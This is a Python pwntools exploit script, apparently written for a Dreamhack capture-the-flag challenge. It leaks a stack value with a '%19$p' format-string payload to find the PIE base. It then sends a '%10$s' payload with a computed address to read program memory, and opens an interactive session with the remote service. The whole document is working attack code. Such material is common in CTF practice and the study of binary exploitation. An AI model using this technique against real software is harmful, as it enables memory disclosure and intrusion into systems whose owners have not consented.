#!/usr/bin/env python3
from pwn import *

PORT = 15701
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x000000000000139F
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)
def s(dt): p.send(dt)
def sl(dt): p.sendline(dt)

sla(b'> ', b'1')

sla(b'> ', b'2')
s(b'%19$p')
PIE = int(p.recvuntil(b'> ', drop = True), 16) - 0x143e
log.info(f'PIE: {hex(PIE)}')

sl(b'2')

# GDB()
fmt = b'%10$s'
pl = fmt.ljust(0x20, b'B') + p64(PIE + 0x4060)
s(pl)
p.interactive()